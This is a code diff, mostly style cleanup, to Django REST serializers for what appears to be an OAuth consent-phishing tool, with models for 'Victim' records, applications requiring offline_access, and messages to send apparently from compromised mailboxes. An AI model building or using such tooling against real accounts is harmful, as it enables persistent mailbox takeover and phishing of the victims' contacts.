@@ -1,15 +1,13 @@
-import io
 from base64 import b64encode
 from rest_framework import serializers
 from .models import Application, Victim
 from .helper import get_authorization_url
-from .objects import Attachment
 from django.contrib.sites.models import Site
 from urllib.parse import urlparse
 import magic
 
-class ApplicationSerializer(serializers.ModelSerializer):
 
+class ApplicationSerializer(serializers.ModelSerializer):
 
     class Meta:
         model = Application
@@ -17,10 +15,10 @@ class ApplicationSerializer(serializers.ModelSerializer):
 
     def validate_scopes(self, value):
         scopes = value
-        if not 'user.read' in scopes:
+        if 'user.read' not in scopes:
             raise serializers.ValidationError("Application scope must include user.read!")
 
-        if not 'offline_access' in scopes:
+        if 'offline_access' not in scopes:
             raise serializers.ValidationError("Application scope must include offline_access")
 
         return scopes
@@ -34,36 +32,34 @@ class ApplicationSerializer(serializers.ModelSerializer):
 
         return redirect_url
 
-
     def to_representation(self, instance):
         ret = super().to_representation(instance)
         ret['authorization_url_full'] = get_authorization_url(instance)
         return ret
 
 
-
-
 class VictimSerializer(serializers.ModelSerializer):
     class Meta:
         model = Victim
-        fields = ['id','name', 'email']
+        fields = ['id', 'name', 'email']
+
 
 class VictimDetailSerializer(serializers.ModelSerializer):
     class Meta:
         model = Victim
         fields = '__all__'
 
+
 class RecipientSerializer(serializers.Serializer):
-    emailAddress = serializers.DictField(required= False, child= serializers.CharField())
+    emailAddress = serializers.DictField(required=False, child=serializers.CharField())
 
 
 class AttachmentSerializer(serializers.Serializer):
     contentType = serializers.ReadOnlyField()
-    isInline = serializers.ReadOnlyField(default= False)
-    name= serializers.CharField()
+    isInline = serializers.ReadOnlyField(default=False)
+    name = serializers.CharField()
     size = serializers.ReadOnlyField()
-    contentBytes = serializers.ReadOnlyField(default = 'XXX')
-
+    contentBytes = serializers.ReadOnlyField(default='XXX')
 
     def to_internal_value(self, data):
         filebuff = b64encode(data['file'].read())
@@ -77,17 +73,15 @@ class AttachmentSerializer(serializers.Serializer):
         return data
 
 
-
-
 class MessageSerializer(serializers.Serializer):
-    bccRecipients = serializers.ListField( required= False, child= RecipientSerializer() )
-    body = serializers.DictField( required= True, child= serializers.CharField() )
-    ccRecipients = serializers.ListField( required= False, child= RecipientSerializer() )
-    replyTo = serializers.ListField( required= False, child= RecipientSerializer() )
+    bccRecipients = serializers.ListField(required=False, child=RecipientSerializer())
+    body = serializers.DictField(required=True, child=serializers.CharField())
+    ccRecipients = serializers.ListField(required=False, child=RecipientSerializer())
+    replyTo = serializers.ListField(required=False, child=RecipientSerializer())
     subject = serializers.CharField()
-    toRecipients = serializers.ListField( required= False, child= RecipientSerializer() )
+    toRecipients = serializers.ListField(required=False, child=RecipientSerializer())
     # attachments = serializers.ListField( required= False, child= AttachmentSerializer() )
-    hasAttachments = serializers.HiddenField(default= False)
+    hasAttachments = serializers.HiddenField(default=False)
 
     def validate(self, data):
         if 'toRecipients' not in data and 'bccRecipients' not in data and 'ccRecipients' not in data:
@@ -97,6 +91,7 @@ class MessageSerializer(serializers.Serializer):
             data['hasAttachments'] = True
 
         return data
+
 
 class MessageWrapperSerializer(serializers.Serializer):
     SaveToSentItems = serializers.BooleanField(default=False)
